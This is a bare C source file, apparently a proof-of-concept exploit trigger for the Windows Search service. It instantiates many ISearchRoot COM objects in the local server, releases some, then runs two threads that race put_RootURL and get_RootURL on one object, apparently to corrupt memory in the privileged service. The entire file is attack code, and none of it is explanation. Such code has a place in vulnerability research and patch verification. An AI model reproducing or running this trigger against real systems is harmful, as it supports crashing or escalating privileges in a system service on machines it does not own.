#include<stdio.h>
#include<windows.h>
#include<searchapi.h>

ISearchRoot* SearchRoot;

DWORD __stdcall thread_getter(LPVOID param)
{
    ISearchRoot* pISearchRoot = (ISearchRoot*)param;
    PWSTR get_pszUrl;
    while (1) {
        pISearchRoot->get_RootURL(&get_pszUrl);
    }
    return 0;
}

DWORD __stdcall thread_putter(LPVOID param)
{
    ISearchRoot* pSearchManager = (ISearchRoot*)param;
    while (1) {
        pSearchManager->put_RootURL(L"AA");
        pSearchManager->put_RootURL(L"AAAAAAAAAA");
    }
    return 0;
}
int main() {
    CLSID clsid;
    IID iid;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    CLSIDFromString(L"{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7}", &clsid);
    IIDFromString(L"{04c18ccf-1f57-4cbd-88cc-3900f5195ce3}", &iid);

    ISearchRoot* pISearchRoot[20];
    for (int i = 0; i < 20; i++) {
        HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, (LPVOID*)&pISearchRoot[i]);
        if (hr != S_OK)
        {
            printf("Create SearchRoot ERROR %x\n", hr);
            getchar();//E_NOINTERFACE
            return 0;
        }

    }
    pISearchRoot[3]->Release();
    pISearchRoot[5]->Release();
    pISearchRoot[7]->Release();
    pISearchRoot[9]->Release();
    pISearchRoot[11]->Release();


    CreateThread(NULL, 0, thread_putter, (LPVOID)pISearchRoot[13], 0, NULL);
    CreateThread(NULL, 0, thread_getter, (LPVOID)pISearchRoot[13], 0, NULL);
    Sleep(500);

    CoUninitialize();

    return 0;
}
